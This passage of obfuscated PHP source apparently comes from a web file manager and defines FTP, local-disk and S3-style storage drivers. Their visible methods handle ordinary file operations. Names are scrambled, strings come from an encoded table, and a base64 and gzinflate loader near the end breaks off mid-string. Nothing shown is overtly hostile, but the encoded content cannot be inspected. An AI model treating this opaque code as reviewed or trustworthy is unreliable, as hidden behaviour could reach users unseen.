(!$this->_isconn()) { return !1; } $û¶ßÄÍı = $this->pathThis($this->iconvSystem($‚ÏçŠêş)); $¬ëË©©« = $this->tempFile($û¶ßÄÍı); file_put_contents($¬ëË©©«, $£ŞˆœÍÄ); $Ñ•¾Ö¯¼ = $this->upload($‚ÏçŠêş, $this->iconvApp($¬ëË©©«)); $this->tempFileRemve($¬ëË©©«); return $Ñ•¾Ö¯¼; } public function fileSubstr($½Ò•ã¯ß, $ãÁ´¹ãÙ = 0, $ŞÅÑÚ· = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($½Ò•ã¯ß, $ãÁ´¹ãÙ, $ŞÅÑÚ·); } private function ftpRequest($³ïÖ²Šã, $æ‚“ø™ = 0, $œ™ÄÖ®ø = false) { $³ïÖ²Šã = $this->iconvSystem($³ïÖ²Šã); $òªÙåÑ = $this->scheme . $this->host . $_SERVER[ĞÂ¤àÓï][4] . $this->port; $î˜ÖåèÚ = curl_init(); curl_setopt($î˜ÖåèÚ, CURLOPT_URL, $òªÙåÑ . $this->pathEncode($³ïÖ²Šã)); curl_setopt($î˜ÖåèÚ, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($œ™ÄÖ®ø) { $Øè‰Ï‡Ş = $æ‚“ø™ + $œ™ÄÖ®ø - 1; curl_setopt($î˜ÖåèÚ, CURLOPT_RANGE, "{$æ‚“ø™}\55{$Øè‰Ï‡Ş}"); } curl_setopt($î˜ÖåèÚ, CURLOPT_RETURNTRANSFER, 1); $¾ËÃßÆŒ = curl_exec($î˜ÖåèÚ); curl_close($î˜ÖåèÚ); return $¾ËÃßÆŒ; } public function upload($Ùù‘¢‡, $š¡ÆêÛ, $¿Ìš©±Š = false, $‹€‡Ä¨õ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Ùù‘¢‡))) { return !1; } $Ùù‘¢‡ = $this->iconvSystem($Ùù‘¢‡); $š¡ÆêÛ = $this->iconvSystem($š¡ÆêÛ); $éÌ™°²¸ = ftp_nb_put($this->connect, $Ùù‘¢‡, $š¡ÆêÛ, FTP_BINARY); while ($éÌ™°²¸ == FTP_MOREDATA) { $éÌ™°²¸ = ftp_nb_continue($this->connect); } if ($éÌ™°²¸ != FTP_FINISHED) { return !1; } return $this->getPathOuter($Ùù‘¢‡); } public function download($ûõûÂíÔ, $ÄïÊ‹Š = '') { if (!$this->_isconn()) { return !1; } $¤ş¹’Ğı = $this->pathFather($ÄïÊ‹Š); if (!IO::mkdir($¤ş¹’Ğı)) { return !1; } $ûõûÂíÔ = $this->iconvSystem($ûõûÂíÔ); $ÄïÊ‹Š = $this->iconvSystem($ÄïÊ‹Š); $ºä–Ğ€¿ = ftp_nb_get($this->connect, $ÄïÊ‹Š, $ûõûÂíÔ, FTP_BINARY); while ($ºä–Ğ€¿ == FTP_MOREDATA) { $ºä–Ğ€¿ = ftp_nb_continue($this->connect); } if ($ºä–Ğ€¿ != FTP_FINISHED) { return !1; } return $this->iconvApp($ÄïÊ‹Š); } public function exist($•ŞÛĞÕ¯) { return $this->isFile($•ŞÛĞÕ¯) || $this->isFolder($•ŞÛĞÕ¯); } public function isFile($ø•Ë–Ïà) { return !$this->isFolder($ø•Ë–Ïà) && $this->objectMeta($ø•Ë–Ïà); } public function isFolder($áÄá›õò) { return $this->cacheMethod($_SERVER[ĞÂ¤àÓï][165], $áÄá›õò); } protected function objectMeta($ÀÄ¦½ê§) { return $this->cacheMethod($_SERVER[ĞÂ¤àÓï][167], $ÀÄ¦½ê§); } protected function _objectMeta($ÏôşÒ¿‚) { $ÆÜ±ê±€ =& $_SERVER[ĞÂ¤àÓï]; if ($ÏôşÒ¿‚ == $ÆÜ±ê±€[12] || $ÏôşÒ¿‚ == $ÆÜ±ê±€[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ÏôşÒ¿‚ = $this->iconvSystem($ÏôşÒ¿‚); $Ò¥Ùà…Á = array($ÆÜ±ê±€[32] => $this->iconvApp($ÏôşÒ¿‚), $ÆÜ±ê±€[33] => $ÆÜ±ê±€[199], $ÆÜ±ê±€[76] => 0); @ftp_chdir($this->connect, $ÆÜ±ê±€[8]); $áÖÇáòÒ = @ftp_size($this->connect, $ÏôşÒ¿‚); if ($áÖÇáòÒ != -1) { $Ò¥Ùà…Á[$ÆÜ±ê±€[76]] = $áÖÇáòÒ; } else { $Õ Ö®Åç = @ftp_chdir($this->connect, $ÏôşÒ¿‚); if (!$Õ Ö®Åç) { return !1; } $Ò¥Ùà…Á[$ÆÜ±ê±€[33]] = $ÆÜ±ê±€[75]; } return $Ò¥Ùà…Á; } protected function _isFolder($í¡ÂÁ×È) { $Äì¼¢¼Ü =& $_SERVER[ĞÂ¤àÓï]; if ($í¡ÂÁ×È == $Äì¼¢¼Ü[12] || $í¡ÂÁ×È == $Äì¼¢¼Ü[8]) { return !0; } $‹š°Ã… = $this->_objectMeta($í¡ÂÁ×È); return isset($‹š°Ã…[$Äì¼¢¼Ü[33]]) && $‹š°Ã…[$Äì¼¢¼Ü[33]] == $Äì¼¢¼Ü[75] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($•§¤×òà) { if (substr($•§¤×òà, 0, 2) == $_SERVER[ĞÂ¤àÓï][1377]) { $•§¤×òà = BASIC_PATH . substr($•§¤×òà, 2); } return $•§¤×òà; } public function iconvApp($ˆ£şëÙ‘) { $—“ä”Š =& $_SERVER[ĞÂ¤àÓï]; global $config; return $this->iconvTo($ˆ£şëÙ‘, $config[$—“ä”Š[1375]], $config[$—“ä”Š[1374]]); } public function iconvSystem($È²€ŠóÓ) { $Ø·¡íÄş =& $_SERVER[ĞÂ¤àÓï]; global $config; return $this->iconvTo($È²€ŠóÓ, $config[$Ø·¡íÄş[1374]], $config[$Ø·¡íÄş[1375]]); } public function getPathOuter($ŒÌûÓ¼Œ) { $ƒ®§Öúš =& $_SERVER[ĞÂ¤àÓï]; $à™é…°Ã = $this->iconvApp($this->pathBase); $ŒÌûÓ¼Œ = $this->iconvApp($ŒÌûÓ¼Œ); if (substr($à™é…°Ã, 0, 2) == $ƒ®§Öúš[1377]) { $à™é…°Ã = BASIC_PATH . substr($à™é…°Ã, 2); } if (substr($ŒÌûÓ¼Œ, 0, 2) == $ƒ®§Öúš[1377]) { $ŒÌûÓ¼Œ = BASIC_PATH . substr($ŒÌûÓ¼Œ, 2); } $à™é…°Ã = KodIO::clear($à™é…°Ã); $ŒÌûÓ¼Œ = KodIO::clear($ŒÌûÓ¼Œ); $ŒÌûÓ¼Œ = substr($ŒÌûÓ¼Œ, strlen($à™é…°Ã)); if (empty($this->pathDriver)) { return $ŒÌûÓ¼Œ; } return $this->pathDriver . $ƒ®§Öúš[8] . ltrim($ŒÌûÓ¼Œ, $ƒ®§Öúš[8]); } public function mkfile($öâ»Òµö, $ŠóÎŸ˜À = '', $›ìüşİÖ = REPEAT_RENAME) { $öâ»Òµö = $this->iconvSystem($öâ»Òµö); @touch($öâ»Òµö); if ($ŠóÎŸ˜À) { file_put_contents($öâ»Òµö, $ŠóÎŸ˜À); } @chmod($öâ»Òµö, $this->pathAuth); return is_file($öâ»Òµö) ? $this->getPathOuter($öâ»Òµö) : !1; } public function mkdir($Ï›åı³—, $ËÙÖİú = REPEAT_SKIP) { $Ï›åı³— = $this->iconvSystem($Ï›åı³—); if (is_dir($Ï›åı³—)) { return $this->getPathOuter($Ï›åı³—); } @mkdir($Ï›åı³—, $this->pathAuth, !0); @chmod($Ï›åı³—, $this->pathAuth); return is_dir($Ï›åı³—) ? $this->getPathOuter($Ï›åı³—) : !1; } public function copyFile($ó‚Ü¥Òº, $ÍË˜Îæ„) { $this->mkdir($this->pathFather($ÍË˜Îæ„)); $ó‚Ü¥Òº = $this->iconvSystem($ó‚Ü¥Òº); $ÍË˜Îæ„ = $this->iconvSystem($ÍË˜Îæ„); $ˆ°£¾²Ù = copy_64($ó‚Ü¥Òº, $ÍË˜Îæ„); @chmod($ÍË˜Îæ„, $this->pathAuth); return $ˆ°£¾²Ù ? $this->getPathOuter($ÍË˜Îæ„) : !1; } public function moveFile($Â² ª×Ê, $ÌÊşù) { $this->mkdir($this->pathFather($ÌÊşù)); $Â² ª×Ê = $this->iconvSystem($Â² ª×Ê); $ÌÊşù = $this->iconvSystem($ÌÊşù); $úİ¢§ü© = intval(@rename($Â² ª×Ê, $ÌÊşù)); if (!$úİ¢§ü©) { if ($úİ¢§ü© = intval(@copy_64($Â² ª×Ê, $ÌÊşù))) { @unlink($Â² ª×Ê); } } @chmod($ÌÊşù, $this->pathAuth); return $úİ¢§ü© ? $this->getPathOuter($ÌÊşù) : !1; } public function movePath($ƒ µ„û, $ÉÙô¶á, $¡’…—×õ = false) { $Æû¼Â×¦ =& $_SERVER[ĞÂ¤àÓï]; $ƒ µ„û = $this->iconvSystem($ƒ µ„û); $ÉÙô¶á = $this->iconvSystem($ÉÙô¶á); $ª¶‚ì¾É = rtrim($ÉÙô¶á, $Æû¼Â×¦[8]) . $Æû¼Â×¦[8] . ($¡’…—×õ ? $¡’…—×õ : get_path_this($ƒ µ„û)); if (file_exists($ª¶‚ì¾É)) { return !1; } $•ÆÊìÉŠ = intval(@rename($ƒ µ„û, $ª¶‚ì¾É)); $•ÆÊìÉŠ = file_exists($ª¶‚ì¾É); return $•ÆÊìÉŠ ? $this->getPathOuter($ª¶‚ì¾É) : !1; } public function delFile($¨òâ‘š) { $¨òâ‘š = $this->iconvSystem($¨òâ‘š); if (!@unlink($¨òâ‘š)) { @chmod($¨òâ‘š, $this->pathAuth); if (!@unlink($¨òâ‘š)) { return !1; } } else { return !0; } } public function delFolder($°ØÇ¡Şö) { $îØ“á´ =& $_SERVER[ĞÂ¤àÓï]; $°ØÇ¡Şö = $this->iconvSystem($°ØÇ¡Şö); if (!is_dir($°ØÇ¡Şö)) { return !0; } if (!($ôà¿ï® = opendir($°ØÇ¡Şö))) { return !1; } while (($çŠÒå«Ç = readdir($ôà¿ï®)) !== !1) { if ($çŠÒå«Ç == $îØ“á´[10] || $çŠÒå«Ç == $îØ“á´[1384]) { continue; } $—Ù òÛ§ = $°ØÇ¡Şö . $îØ“á´[8] . $çŠÒå«Ç; if (is_file($—Ù òÛ§) || is_link($—Ù òÛ§)) { if (!unlink($—Ù òÛ§)) { chmod($—Ù òÛ§, $this->pathAuth); if (!unlink($—Ù òÛ§)) { return !1; } } } else { if (is_dir($—Ù òÛ§)) { chmod($—Ù òÛ§, $this->pathAuth); $—Ù òÛ§ = $this->iconvApp($—Ù òÛ§); if (!$this->delFolder($—Ù òÛ§)) { return !1; } } } } closedir($ôà¿ï®); return rmdir($°ØÇ¡Şö); } public function rename($®ˆ®Ùøè, $ò›£ßá¸) { $Œ¯ºÌğ¶ =& $_SERVER[ĞÂ¤àÓï]; $Öç“Ã´­ = $this->fileNameAuto($this->pathFather($®ˆ®Ùøè), $ò›£ßá¸); $Öç“Ã´­ = $this->iconvSystem($Öç“Ã´­); $®ˆ®Ùøè = $this->iconvSystem($®ˆ®Ùøè); $şË·®—¬ = $this->pathFather($®ˆ®Ùøè); $È‡àÈ±¡ = rtrim($şË·®—¬, $Œ¯ºÌğ¶[8]) . $Œ¯ºÌğ¶[8] . $Öç“Ã´­; $ÅäÃÜ¶³ = @rename($®ˆ®Ùøè, $È‡àÈ±¡); $È‡àÈ±¡ = $this->iconvApp($È‡àÈ±¡); return $ÅäÃÜ¶³ ? $this->getPathOuter($È‡àÈ±¡) : !1; } public function size($§±ß¨ïí) { $§±ß¨ïí = $this->iconvSystem($§±ß¨ïí); return filesize_64($§±ß¨ïí); } public function info($Ãñ¼¢ı) { $Ãñ¼¢ı = $this->iconvSystem($Ãñ¼¢ı); if ($this->isFolder($Ãñ¼¢ı)) { return $this->folderInfo($Ãñ¼¢ı); } else { if ($this->isFile($Ãñ¼¢ı)) { return $this->fileInfo($Ãñ¼¢ı); } } return !1; } protected function infoChildren($¶Ü«¡Ø, &$ˆñÒÇ¡¶, $¦ËÁ±í = true) { $§—ÕÌ =& $_SERVER[ĞÂ¤àÓï]; check_abort_echo(); $¶Ü«¡Ø = rtrim($¶Ü«¡Ø, $§—ÕÌ[8]) . $§—ÕÌ[8]; if ($¦ËÁ±í) { $¶Ü«¡Ø = $this->iconvSystem($¶Ü«¡Ø); } if (!($¼ÖüÔÇÃ = @opendir($¶Ü«¡Ø))) { return; } while (($‹ìã€ñ¬ = readdir($¼ÖüÔÇÃ)) !== !1) { if ($‹ìã€ñ¬ == $§—ÕÌ[10] || $‹ìã€ñ¬ == $§—ÕÌ[1384]) { continue; } $Ü©±ÀÕÄ = $¶Ü«¡Ø . $‹ìã€ñ¬; if (is_file($Ü©±ÀÕÄ) || is_link($Ü©±ÀÕÄ)) { $ˆñÒÇ¡¶[$§—ÕÌ[77]]++; $ˆñÒÇ¡¶[$§—ÕÌ[76]] += filesize_64($Ü©±ÀÕÄ); } else { if (is_dir($Ü©±ÀÕÄ)) { $ˆñÒÇ¡¶[$§—ÕÌ[78]]++; $this->infoChildren($Ü©±ÀÕÄ, $ˆñÒÇ¡¶, !1); } } } closedir($¼ÖüÔÇÃ); } private function folderInfo($òÚÇå¥º, $Àî©½ŠÁ = false) { $Ò’ŞóèÈ =& $_SERVER[ĞÂ¤àÓï]; $òÚÇå¥º = rtrim($òÚÇå¥º, $Ò’ŞóèÈ[8]) . $Ò’ŞóèÈ[8]; $úªÄüÌ = $this->iconvApp($this->pathThis($òÚÇå¥º)); if ($Àî©½ŠÁ) { return array($Ò’ŞóèÈ[32] => $úªÄüÌ, $Ò’ŞóèÈ[84] => $this->getPathOuter($òÚÇå¥º), $Ò’ŞóèÈ[33] => $Ò’ŞóèÈ[75]); } $ŸŞéÀ¯Ç = array($Ò’ŞóèÈ[32] => $úªÄüÌ, $Ò’ŞóèÈ[84] => $this->getPathOuter($òÚÇå¥º), $Ò’ŞóèÈ[33] => $Ò’ŞóèÈ[75], $Ò’ŞóèÈ[200] => @filectime($òÚÇå¥º), $Ò’ŞóèÈ[85] => @filemtime($òÚÇå¥º), $Ò’ŞóèÈ[1387] => @fileatime($òÚÇå¥º), $Ò’ŞóèÈ[1388] => is_readable($òÚÇå¥º), $Ò’ŞóèÈ[1389] => is_writable($òÚÇå¥º), $Ò’ŞóèÈ[1390] => get_mode($òÚÇå¥º)); return $ŸŞéÀ¯Ç; } private function fileInfo($ÉÓ÷¼”Ú, $ËîÈ’îÔ = false) { $ëÖÎç¬Ÿ =& $_SERVER[ĞÂ¤àÓï]; $ıÉÃšÌ = $this->iconvApp($this->pathThis($ÉÓ÷¼”Ú)); if ($ËîÈ’îÔ) { return array($ëÖÎç¬Ÿ[32] => $ıÉÃšÌ, $ëÖÎç¬Ÿ[84] => $this->getPathOuter($ÉÓ÷¼”Ú), $ëÖÎç¬Ÿ[33] => $ëÖÎç¬Ÿ[199], $ëÖÎç¬Ÿ[76] => $this->size($ÉÓ÷¼”Ú), $ëÖÎç¬Ÿ[174] => $this->ext($ıÉÃšÌ)); } $®ÄâçÂõ = array($ëÖÎç¬Ÿ[32] => $ıÉÃšÌ, $ëÖÎç¬Ÿ[84] => $this->getPathOuter($ÉÓ÷¼”Ú), $ëÖÎç¬Ÿ[33] => $ëÖÎç¬Ÿ[199], $ëÖÎç¬Ÿ[200] => @filectime($ÉÓ÷¼”Ú), $ëÖÎç¬Ÿ[85] => @filemtime($ÉÓ÷¼”Ú), $ëÖÎç¬Ÿ[1387] => @fileatime($ÉÓ÷¼”Ú), $ëÖÎç¬Ÿ[76] => $this->size($ÉÓ÷¼”Ú), $ëÖÎç¬Ÿ[174] => $this->ext($ıÉÃšÌ), $ëÖÎç¬Ÿ[1388] => is_readable($ÉÓ÷¼”Ú), $ëÖÎç¬Ÿ[1389] => is_writable($ÉÓ÷¼”Ú), $ëÖÎç¬Ÿ[1390] => get_mode($ÉÓ÷¼”Ú)); return $®ÄâçÂõ; } public function exist($Ñ²€¦ü¥) { $Ñ²€¦ü¥ = $this->iconvSystem($Ñ²€¦ü¥); return @file_exists($Ñ²€¦ü¥); } public function isFile($§şÛ¤ñ“) { $§şÛ¤ñ“ = $this->iconvSystem($§şÛ¤ñ“); return @is_file($§şÛ¤ñ“); } public function isFolder($æ¨¿öÈ£) { $æ¨¿öÈ£ = $this->iconvSystem($æ¨¿öÈ£); return @is_dir($æ¨¿öÈ£); } public function listPath($õøÏàÙ», $‚»‘€‹í = false) { $ãŞœ‹ =& $_SERVER[ĞÂ¤àÓï]; $õøÏàÙ» = $this->iconvSystem($õøÏàÙ»); $õøÏàÙ» = rtrim($õøÏàÙ», $ãŞœ‹[8]) . $ãŞœ‹[8]; $’ùõ“º¯ = array($ãŞœ‹[82] => array(), $ãŞœ‹[83] => array()); if (!($¸æÙİÌô = @opendir($õøÏàÙ»))) { return $’ùõ“º¯; } while (($´®¸İÃ¾ = readdir($¸æÙİÌô)) !== !1) { if ($´®¸İÃ¾ == $ãŞœ‹[10] || $´®¸İÃ¾ == $ãŞœ‹[1384]) { continue; } $Ë¶éš„Ù = $õøÏàÙ» . $´®¸İÃ¾; if (is_file($Ë¶éš„Ù)) { $’ùõ“º¯[$ãŞœ‹[83]][] = $this->fileInfo($Ë¶éš„Ù, $‚»‘€‹í); } else { $’ùõ“º¯[$ãŞœ‹[82]][] = $this->folderInfo($Ë¶éš„Ù, $‚»‘€‹í); } } closedir($¸æÙİÌô); return $’ùõ“º¯; } public function listAll($À›Î“Üæ, &$Ö»İıÓ = array()) { $ûŠŞÃï =& $_SERVER[ĞÂ¤àÓï]; $À›Î“Üæ = $this->iconvSystem($À›Î“Üæ); $À›Î“Üæ = rtrim($À›Î“Üæ, $ûŠŞÃï[8]) . $ûŠŞÃï[8]; if (!($ÖĞÚø‘ƒ = @opendir($À›Î“Üæ))) { return $Ö»İıÓ; } while (($…èöÇ¢ = readdir($ÖĞÚø‘ƒ)) !== !1) { if ($…èöÇ¢ == $ûŠŞÃï[10] || $…èöÇ¢ == $ûŠŞÃï[1384]) { continue; } $Ó´Şë“È = $À›Î“Üæ . $…èöÇ¢; if (is_dir($Ó´Şë“È) && !is_link($Ó´Şë“È)) { $Ö»İıÓ[] = array($ûŠŞÃï[84] => $Ó´Şë“È . $ûŠŞÃï[8], $ûŠŞÃï[75] => 1, $ûŠŞÃï[85] => @filemtime($Ó´Şë“È), $ûŠŞÃï[76] => 0); $this->listAll($Ó´Şë“È, $Ö»İıÓ); } else { $Ö»İıÓ[] = array($ûŠŞÃï[84] => $Ó´Şë“È, $ûŠŞÃï[75] => 0, $ûŠŞÃï[85] => @filemtime($Ó´Şë“È), $ûŠŞÃï[76] => $this->size($Ó´Şë“È)); } } closedir($ÖĞÚø‘ƒ); return $Ö»İıÓ; } public function has($ü¤ÅŒ“‘, $ŸîÊƒÚ¾ = false, $Ú’÷Ç¡ù = true) { $¼±ôĞ¢ =& $_SERVER[ĞÂ¤àÓï]; $ü¤ÅŒ“‘ = $this->iconvSystem($ü¤ÅŒ“‘); $ü¤ÅŒ“‘ = rtrim($ü¤ÅŒ“‘, $¼±ôĞ¢[8]) . $¼±ôĞ¢[8]; if (!($Ù£Û“å€ = @opendir($ü¤ÅŒ“‘))) { return !1; } $¼ñÅµÇõ = 0; $õºúÚÒš = 0; $áÒŠˆË¢ = 0; while (($•Ë¼Ö±è = readdir($Ù£Û“å€)) !== !1) { if ($•Ë¼Ö±è == $¼±ôĞ¢[10] || $•Ë¼Ö±è == $¼±ôĞ¢[1384]) { continue; } $¡Ø…‡ = $ü¤ÅŒ“‘ . $•Ë¼Ö±è; if ($ŸîÊƒÚ¾) { $áÒŠˆË¢++; if (@is_file($¡Ø…‡)) { $¼ñÅµÇõ++; } else { $õºúÚÒš++; } if ($áÒŠˆË¢ > 10000) { break; } continue; } if ($Ú’÷Ç¡ù) { if (@is_file($¡Ø…‡)) { return !0; } } else { if (@is_dir($¡Ø…‡ . $¼±ôĞ¢[8])) { return !0; } } } closedir($Ù£Û“å€); if ($ŸîÊƒÚ¾) { return array($¼±ôĞ¢[207] => $¼ñÅµÇõ, $¼±ôĞ¢[208] => $õºúÚÒš); } return !1; } public function hashSimple($úâ¥ŠÍ) { $¨å´÷ªš =& $_SERVER[ĞÂ¤àÓï]; if (!$úâ¥ŠÍ) { return md5($¨å´÷ªš[12]); } $úâ¥ŠÍ = $this->iconvSystem($úâ¥ŠÍ); $Ñï²¿ŒÍ = $this->size($úâ¥ŠÍ); $ë¡±ä§  = 200; $«€£úÎƒ = 50; if ($Ñï²¿ŒÍ <= $ë¡±ä§  * $«€£úÎƒ) { return $this->hashMd5($úâ¥ŠÍ) . $Ñï²¿ŒÍ; } $‹Â×ûş = $¨å´÷ªš[12]; $ş¾³Äè½ = intval($Ñï²¿ŒÍ / $«€£úÎƒ); $ÉÂùÚ‘˜ = fopen($úâ¥ŠÍ, $¨å´÷ªš[1391]); if (!$ÉÂùÚ‘˜) { return $‹Â×ûş; } for ($ÙÃŞ»É = 0; $ÙÃŞ»É < $«€£úÎƒ; $ÙÃŞ»É++) { fseek_64($ÉÂùÚ‘˜, $ş¾³Äè½ * $ÙÃŞ»É); $‹Â×ûş .= fread($ÉÂùÚ‘˜, $ë¡±ä§ ); } fseek_64($ÉÂùÚ‘˜, $Ñï²¿ŒÍ - $ë¡±ä§ ); $‹Â×ûş .= fread($ÉÂùÚ‘˜, $ë¡±ä§ ); fclose($ÉÂùÚ‘˜); return md5($‹Â×ûş) . $Ñï²¿ŒÍ; } public function getContent($˜’ŞîÒ×) { $˜’ŞîÒ× = $this->iconvSystem($˜’ŞîÒ×); return file_get_contents($˜’ŞîÒ×); } public function setContent($È¬æ€ÏÕ, $ü•ÆİùÃ = '') { $È¬æ€ÏÕ = $this->iconvSystem($È¬æ€ÏÕ); $„ñ¸¾û = @file_put_contents($È¬æ€ÏÕ, $ü•ÆİùÃ, LOCK_EX); clearstatcache(); @chmod($È¬æ€ÏÕ, $this->pathAuth); return $„ñ¸¾û === !1 ? !1 : !0; } public function fileSubstr($Ü‘Ë°ÛÇ, $§ëÄŞºï = 0, $µ»ÔÇÉ¡ = false) { $ôÚòâ =& $_SERVER[ĞÂ¤àÓï]; $Ü‘Ë°ÛÇ = $this->iconvSystem($Ü‘Ë°ÛÇ); if ($µ»ÔÇÉ¡ === !1) { $µ»ÔÇÉ¡ = $this->size($Ü‘Ë°ÛÇ); } if ($µ»ÔÇÉ¡ <= 0) { return $ôÚòâ[12]; } $²Êœ·åğ = fopen($Ü‘Ë°ÛÇ, $ôÚòâ[1391]); if (!$²Êœ·åğ) { return !1; } fseek_64($²Êœ·åğ, $§ëÄŞºï); $‹èÌçé§ = fread($²Êœ·åğ, $µ»ÔÇÉ¡); fclose($²Êœ·åğ); return $‹èÌçé§; } public function upload($ñË‚åãÍ, $È¬â¬­, $Ãç…ˆ§ = false, $³˜Ûˆ¦î = REPEAT_REPLACE) { if ($Ãç…ˆ§) { return $this->moveFile($È¬â¬­, $ñË‚åãÍ); } return $this->copyFile($È¬â¬­, $ñË‚åãÍ); } public function setModifyTime($ÙÀò­º¸, $ûÇ†ÑïÃ = '') { @touch($ÙÀò­º¸, intval($ûÇ†ÑïÃ)); } public function download($ûÕùÊÀŒ, $¦£ëú‡Û) { return $this->iconvSystem($ûÕùÊÀŒ); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($‘¼å•üñ) { parent::__construct($‘¼å•üñ); $this->signatureVersion($_SERVER[ĞÂ¤àÓï][216]); } public function fileOutLink($Í²Š®´­) { $‡…êá· =& $_SERVER[ĞÂ¤àÓï]; if (substr($Í²Š®´­, 0, 7) == $‡…êá·[1334]) { $Í²Š®´­ = $‡…êá·[1335] . substr($Í²Š®´­, 7); } header($‡…êá·[161] . $Í²Š®´­); die; } } goto cµïò‘¦ª–; b¥…¶Î›: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\320\302\244\340\323\357", "\xc6\xf4\xd8\xcb\xc5\xa9"); $_SERVER[ĞÂ¤àÓï] = explode("\174\3\174\1\174\5", gzinflate(substr(base64_decode('H4sIAAAAAAAAE8W9CXgb1dUwDBTKUrYCBco6MQm2Ey2OszuxHdmWYyWyZSQ5m2Um')."\x63\x69\x64\x4d\x2c\x69\xe4\x99\x91\x97\x24\x2c\x29\xd0\x2\x1\xd2\xb2\x2f\x81\x96\xa5\x5\x1a\x96\x86\x50\xa0\xd0\x0\xa5\xd0\x5\x2\x2d\xf0\x52\xb6\x16\x5a\x4a\x2\x94\x14\x28\xb4\xd0\x42"."\x81\xef\x2e\xe7\x2e\x33\x52\xe0\xfd\x9f\xff\x7b\x9e\x2f\xf\x58\x73\xf7\xed\xdc\x73\xcf\x39\xf7\x9c\x73\x5f\x7a\xed\xf1\xab\x2f\xf8\x74\xdd\x57\xd6\xed\xb9\x6e\x9f\xb\x36\x3c\xf3\xcc\x13\xb7"."\323\357\165\173\257\333\153\335\127\351\367\211\33\366\333\203\374\73\174\303\371\165\165\135\263\17\230\326\163\340\306\273\157\327\156\325\176\254\155\210\105\237\330\36\71\350\251\333".base64_decode('Fod33vjExM499/A/PevKJpSZlm2iP0rRdBR93LAdm0akzWLWGKLfRpH+BulPXzxq')."\351\5\323\321\151\60\100\177\124\350\27\371\153\217\344\15\226\256\366\304\222\152\242\257\267\67\34\117\102\246\46\71\275\140\146\340\253\244\131\132\1\332\57\351\226\215\172\43"."\127\247\226\314\222\136\164\305\210\210\214\346\150\203\232\15\65\165\264\251\35\341\336\150\154\205\232\134\321\33\206\34\203\352\110\131\267\46\150\210\174\46\34\315\162\222\106\101"."\xe7\x39\xc6\x2c\xde\xaf\xb6\xf0\xa2\x48\x8f\x92\x8c\x87\x7a\x12\xa1\xf6\x64\x24\xd6\x43\xa3\xdb\x63\xdd\xdd\x91\x64\x65\x7c\x3c\x16\x8d\xb6\x85\xda\x97\x54\xa6\xf4\xc6\x43\x8b\xba\x43\xa\xea"."\137\136\127\215\142\326\254\123\126\321\224\125\112\75\375\350\64\364\174\206\176\26\65\326\35\147\242\4\137\111\376\205\226\251\130\316\347\151\240\207\177\145\364\254\126\316\303\154".base64_decode('dciBkmUUNDboJfoEj6UfWtkxjWKaBsLjjqWJeNTXNFpovQhVJcLRcHtSwR1UOuOx')."\156\5\26\241\240\331\216\156\51\313\272\302\361\260\202\73\335\134\113\306\132\253\0\274\364\240\251\120\102\321\250\262\273\32\34\275\120\142\325\320\62\125\52\213\305\73\302\161"."\245\155\205\42\146\50\155\26\12\146\61\200\152\101\53\351\110\135\15\307\343\364\303\7\340\35\215\340\105\203\100\254\263\63\21\346\41\30\334\51\121\324\223\31\0\237\256\120"."\46\233\167\324\121\55\137\146\140\72\114\177\153\341\7\176\115\33\100\167\304\50\32\145\0\123\250\302\64\371\266\202\217\62\313\255\263\30\75\3\37\5\124\336\204\235\207\266"."\341\50\375\154\156\241\277\363\41\323\240\212\323\164\313\121\365\142\332\314\30\105\330\254\255\0\164\232\223\353\260\14\224\201\206\263\146\76\303\276\155\143\15\14\45\153\344\365"."\x9e\x72\x41\xce\xc2\x83\xe9\x9c\x91\xcf\x58\x6c\x7f\x7d\x51\x4e\x1a\x8c\xf2\xed\x8a\xf3\x8a\x50\x9\xf5\x84\xef\x74\x23\x3b\x21\xf6\x9b\x6d\x96\xad\xb4\x1e\x41\x3b\x42\x94\xeb\xe5\xb9\xa7\x43".base64_decode('Jt1x0OBgbgyzr5Q3tUxCt/jQDLMTFYyVHTmyTLJ1mlahA2EGaB/tCqOvSsIw2xcZ')."\151\306\202\165\375\353\375\237\15\364\57\104\177\352\1\365\245\240\117\71\75\237\127\365\161\35\66\116\41\63\313\146\223\21\264\7\215\142\20\305\320\140\44\246\346\64\73\327"."\235\231\245\222\122\14\243\146\364\361\100\51\127\202\135\315\67\162\312\5\330\170\352\172\114\47\54\341\345\274\231\326\362\362\20\351\167\316\161\112\11\275\230\301\63\1\103\61"."\307\212\144\246\112\272\16\231\72\174\112\106\351\126\126\50\135\115\106\223\315\12\26\362\374\213\215\216\307\331\74\322\31\147\313\231\311\322\217\101\166\54\324\100\203\206\115\60"."\234\330\236\132\251\224\67\322\232\143\230\305\240\231\166\164\307\157\73\226\256\101\215\241\164\132\267\155\177\273\131\164\54\63\357\17\345\363\346\230\77\146\31\103\106\261\111\231".base64_decode('CsgWJaJN7ccIsAl2as18BQMKbmZqc9nJ+ueyHchzW1rRzuqWPww7o0lBneVYkGXr')."\60\354\222\151\33\270\173\115\212\346\70\132\72\207\61\210\250\276\371\13\362\33\305\274\121\324\53\362\206\307\113\206\245\333\254\257\312\242\356\44\124\202\152\327\375\275\226\66".base64_decode('VNCalFJ5EM0M7NQqcTQ3TE2TksZBn1Io247f0hEqMtBxB5Mcyfq78b4y9Iw/gTA2')."\104\317\150\230\251\40\320\121\130\32\215\355\112\46\173\325\110\47\72\222\173\302\152\167\50\331\336\5\335\166\264\41\326\347\50\302\303\274\112\26\271\334\217\366\27\6\256\36"."\64\126\21\331\153\216\351\26\152\270\155\242\111\31\66\63\203\346\170\200\45\341\314\11\204\150\130\146\274\334\45\307\37\327\212\103\170\176\6\47\34\35\100\320\36\35\162\117"._kodDe('KEpqBCUvLyZMhAcDJcu9ojqvKQoiuX1+slqWK5Khe/HEcNlD/NBz21cIqiuU/YwEZQ==')."\xbc\x56\x2c\x15\x